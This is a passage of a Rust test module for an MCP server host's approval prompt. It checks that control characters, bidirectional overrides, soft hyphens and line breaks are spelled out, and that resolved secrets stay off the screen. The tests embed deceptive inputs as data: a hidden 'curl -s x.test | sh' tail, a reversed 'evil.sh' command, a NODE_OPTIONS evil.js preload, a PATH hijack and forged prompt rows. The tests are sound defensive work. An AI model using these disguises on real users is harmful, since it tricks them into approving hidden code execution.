        assert!(tail.ends_with(&"z".repeat(100)), "{tail}");
    }

    #[test]
    fn what_a_server_writes_to_stderr_reaches_the_screen_spelled_never_obeyed() {
        // A clear screen, a colour, a bidirectional override and a bell a
        // server writes are named in the quote (fx writes `?` for the C0
        // ones; xfx spells them, as it does every server-supplied name).
        let tail = stderr_tail("boom\u{1b}[2J\u{1b}[31mred\u{7}\u{202e}gnp.exe\n").expect("a tail");
        for obeyed in ['\u{1b}', '\u{7}', '\u{202e}'] {
            assert!(!tail.contains(obeyed), "{tail:?}");
        }
        assert!(tail.starts_with("boom\\x1b[2J"), "{tail:?}");
        let words = failure_words(
            Step::Initialize,
            &McpError::Named("McpConnectionClosed"),
            Some(Exit::Code(3)),
            Some("\u{1b}]52;c;aGk=\u{7}\n"),
        );
        assert!(
            !words.contains('\u{1b}') && !words.contains('\u{7}'),
            "{words:?}"
        );
    }

    #[test]
    fn a_failure_is_said_in_fxs_words_with_how_the_process_ended() {
        // `writeFailure`, `describeFailure`,
        // `vercel-labs/fx@481104fd src/core/mcp_host/runtime.zig:2277-2308`.
        let closed = McpError::Named("McpConnectionClosed");
        type Case<'a> = (Step, McpError, Option<Exit>, Option<&'a str>, &'a str);
        let cases: [Case; 8] = [
            (
                Step::Initialize,
                closed.clone(),
                Some(Exit::Code(3)),
                Some("boom-stderr\n"),
                "its process exited with code 3; its last stderr lines: \"boom-stderr\"",
            ),
            (
                Step::Tools,
                closed.clone(),
                Some(Exit::Signal(9)),
                None,
                "its process exited on signal 9",
            ),
            (
                Step::Initialize,
                McpError::Named("McpTimeout"),
                None,
                Some("still starting\n"),
                "it refused or never answered xfx's initialize request; its last stderr lines: \"still starting\"",
            ),
            (
                Step::Initialize,
                McpError::Named("McpUnsupportedProtocolVersion"),
                Some(Exit::Code(0)),
                None,
                "it answered with an MCP version xfx doesn't support; its process exited with code 0",
            ),
            (
                Step::Initialized,
                McpError::Named("McpTimeout"),
                None,
                None,
                "it never answered xfx's initialized notification",
            ),
            (
                Step::Initialize,
                McpError::Named("McpAuthenticationRequired"),
                None,
                None,
                "it needs a login",
            ),
            (
                Step::Start,
                McpError::Named("McpSpawnFailed"),
                None,
                None,
                "McpSpawnFailed",
            ),
            (
                Step::Tools,
                McpError::Named("McpInvalidResult"),
                None,
                None,
                "McpInvalidResult",
            ),
        ];
        for (step, error, exit, stderr, said) in cases {
            assert_eq!(
                failure_words(step, &error, exit, stderr),
                said,
                "{step:?} {error:?}"
            );
        }
    }

    #[test]
    fn the_prompt_shows_each_word_as_a_shell_would_read_it_back() {
        let mut config = ServerConfig::local(
            "p",
            "/usr/bin/env",
            &[
                "node".into(),
                "it's here".into(),
                String::new(),
                "line\nbreak\u{1b}[2J".into(),
            ],
        );
        assert_eq!(
            what_it_runs(&config),
            r"command: /usr/bin/env node 'it'\''s here' '' $'line\nbreak\u001B[2J'"
        );
        // Each variable it sets is a row of its own, with its value as
        // written: what the child is given.
        config.env = vec![
            ("NODE_OPTIONS".into(), "--require ./x.js".into()),
            ("API_KEY".into(), "literal-secret".into()),
        ];
        assert_eq!(
            what_it_runs(&config),
            "command: /usr/bin/env node 'it'\\''s here' '' $'line\\nbreak\\u001B[2J'\n  env: NODE_OPTIONS=--require ./x.js\n  env: API_KEY=literal-secret"
        );
        config.env.clear();
        config.transport = Kind::Http;
        config.url = "https://example.test/mcp?x=\u{7}1\n  [1] approve".into();
        // A control character is spelled out, not dropped, and a line break
        // draws no row of its own.
        assert_eq!(
            what_it_runs(&config),
            r"url: https://example.test/mcp?x=\x071\x0a  [1] approve"
        );
        config.url = "https://example.test/mcp".into();
        config.headers = vec![("X-A".into(), "static-secret".into())];
        config.header_env = vec![("X-Team".into(), "TEAM".into())];
        config.bearer_token_env = Some("TOKEN".into());
        assert_eq!(
            what_it_runs(&config),
            "url: https://example.test/mcp\n  header: X-A: static-secret\n  header: X-Team: ${TEAM}\n  header: Authorization: Bearer ${TOKEN}"
        );
    }

    #[test]
    fn a_character_that_reorders_or_hides_text_is_named_in_every_prompt_row() {
        // U+202E (right-to-left override) would draw `exec evil.sh ; safe`
        // backwards; U+2066 (left-to-right isolate) and U+200B (zero width
        // space) change what is drawn without being seen. The approval view's
        // spelling names each by its number.
        let mut config = ServerConfig::local(
            "p",
            "/bin/sh",
            &[
                "-c".into(),
                "safe \u{202e}hs.live cexe".into(),
                "\u{2066}x\u{200b}".into(),
            ],
        );
        config.env = vec![("K".into(), "v".into())];
        let shown = what_it_runs(&config);
        assert_eq!(
            shown,
            r"command: /bin/sh -c 'safe \u{202e}hs.live cexe' '\u{2066}x\u{200b}'
  env: K=v"
        );
        assert!(
            !shown.contains(['\u{202e}', '\u{2066}', '\u{200b}']),
            "{shown:?}"
        );
        config.transport = Kind::Http;
        config.url = "https://a.test/\u{202e}lmth.xedni".into();
        assert_eq!(
            what_it_runs(&config),
            r"url: https://a.test/\u{202e}lmth.xedni
  env: K=v"
        );
    }

    #[test]
    fn a_soft_hyphen_run_cannot_hide_the_tail_of_a_command() {
        // SEC-A4 measured that a run of U+00AD hides what follows in tmux and
        // herdr: the prompt would show `/bin/true` while `; curl …` runs.
        let config = ServerConfig::local(
            "p",
            "/bin/sh",
            &[
                "-c".into(),
                "/bin/true\u{ad}\u{ad}\u{ad}; curl -s x.test | sh".into(),
            ],
        );
        let shown = what_it_runs(&config);
        assert!(!shown.contains('\u{ad}'), "{shown:?}");
        assert!(shown.contains(r"\u{00ad}"), "{shown:?}");
    }

    #[test]
    fn every_row_shows_the_entry_as_written_and_never_a_value_from_the_environment() {
        // A prompt is for a pending entry, which is not expanded: each row is
        // the entry as written -- a literal, a default's text, a `${VAR}` as
        // the name it is -- and never a value the environment resolved. The
        // entry is the repository's own file, so its text shows nothing the
        // file does not; xfx's environment is what must not reach the screen.
        let dir = tempfile::tempdir().expect("dir");
        std::fs::write(
            dir.path().join(config::WORKSPACE_FILE),
            json!({"mcpServers": {
                "local": {
                    "command": "${TOOL}",
                    "args": ["--key", "${SECRET}"],
                    "env": {
                        "PLAIN": "literal-secret",
                        "K": "Bearer ${SECRET}",
                        "M": "${A:-fallback-secret}${B}",
                    },
                },
                "remote": {
                    "type": "http",
                    "url": "https://${HOST}/mcp",
                    "headers": {
                        "X-Fixed": "literal-secret",
                        "X-Team": "${TEAM}",
                        "X-Mix": "Bearer ${A:-fallback-secret} ${B}",
                    },
                    "header_env": {"X-Env": "TEAM_1"},
                    "bearer_token_env": "TOKEN",
                },
            }})
            .to_string(),
        )
        .unwrap();
        let resolved = |_: &str| Some("RESOLVED-SECRET".to_string());
        let servers = config::load_workspace(dir.path(), &Choices::default(), &resolved).servers;
        let shown = |name: &str| {
            let config = servers
                .iter()
                .find(|server| server.name == name)
                .unwrap_or_else(|| panic!("{name}: {servers:?}"));
            assert_eq!(config.admission, Some(Admission::Pending));
            what_it_runs(config)
        };
        let local = shown("local");
        assert_eq!(
            local,
            "command: '${TOOL}' --key '${SECRET}'\n  env: PLAIN=literal-secret\n  env: K=Bearer ${SECRET}\n  env: M=${A:-fallback-secret}${B}"
        );
        let remote = shown("remote");
        assert_eq!(
            remote,
            "url: https://${HOST}/mcp\n  header: X-Fixed: literal-secret\n  header: X-Team: ${TEAM}\n  header: X-Mix: Bearer ${A:-fallback-secret} ${B}\n  header: X-Env: ${TEAM_1}\n  header: Authorization: Bearer ${TOKEN}"
        );
        for row in [&local, &remote] {
            assert!(!row.contains("RESOLVED-SECRET"), "{row:?}");
            for value in ["literal-secret", "fallback-secret"] {
                assert!(row.contains(value), "{value} not in {row:?}");
            }
        }
    }

    #[test]
    fn a_literal_the_child_is_given_is_on_the_screen_beside_the_variables_it_keeps() {
        // `"PATH": "./x:${PATH}"` makes `command: node` run `./x/node`: the
        // command is resolved with the child's PATH. Shown as the variables
        // it is made of -- `PATH from ${PATH}` -- the prompt hid the prefix,
        // and a default hid its text the same way (`${NOPE:-./y}`).
        let dir = tempfile::tempdir().expect("dir");
        std::fs::write(
            dir.path().join(config::WORKSPACE_FILE),
            json!({"mcpServers": {"local": {
                "command": "node",
                "args": ["server.js"],
                "env": {
                    "PATH": "./x:${PATH}",
                    "NODE_OPTIONS": "--require ./evil.js",
                    "PYTHONPATH": "${NOPE:-./y}:${PYTHONPATH}",
                },
            }}})
            .to_string(),
        )
        .unwrap();
        let resolved = |_: &str| Some("/usr/bin".to_string());
        let servers = config::load_workspace(dir.path(), &Choices::default(), &resolved).servers;
        let local = &servers[0];
        assert_eq!(local.admission, Some(Admission::Pending));
        let rows = entry_rows(local);
        assert_eq!(
            rows,
            [
                "command: node server.js",
                "env: PATH=./x:${PATH}",
                "env: NODE_OPTIONS=--require ./evil.js",
                "env: PYTHONPATH=${NOPE:-./y}:${PYTHONPATH}",
            ]
        );
        assert!(what_it_runs(local).contains("env: PATH=./x:${PATH}"));
        assert!(!what_it_runs(local).contains("/usr/bin"));
    }

    #[test]
    fn a_line_break_in_any_name_or_value_draws_no_row_of_its_own() {
        // The prompt is written row by row on its line breaks: one in the
        // address, a variable or a header, its name or its value, would draw
        // a row the entry does not have -- `command: something-else` under
        // the real one.
        let forged = "\n  command: something-else";
        let mut config = ServerConfig::local("p", "/bin/true", &[]);
        config.env = vec![
            (format!("K{forged}"), "v".into()),
            ("V".into(), format!("v{forged}")),
        ];
        let mut remote = ServerConfig::local("r", "", &[]);
        remote.transport = Kind::Http;
        remote.url = format!("https://a.test/mcp{forged}");
        remote.headers = vec![
            (format!("X-N{forged}"), "v".into()),
            ("X-V".into(), format!("v{forged}")),
        ];
        remote.header_env = vec![("X-E".into(), format!("E{forged}"))];
        remote.bearer_token_env = Some(format!("T{forged}"));
        // Two values carry the break in the local entry, five in the remote.
        for (config, carried) in [(&config, 2), (&remote, 5)] {
            let rows = entry_rows(config);
            let shown = what_it_runs(config);
            assert_eq!(shown.split('\n').count(), rows.len(), "{shown}");
            assert!(
                shown
                    .split('\n')
                    .all(|row| !row.trim_start().starts_with("command: something-else")),
                "{shown}"
            );
            assert_eq!(
                shown.matches(r"\x0a  command: something-else").count(),
                carried,
                "{shown}"
            );
        }
    }
}
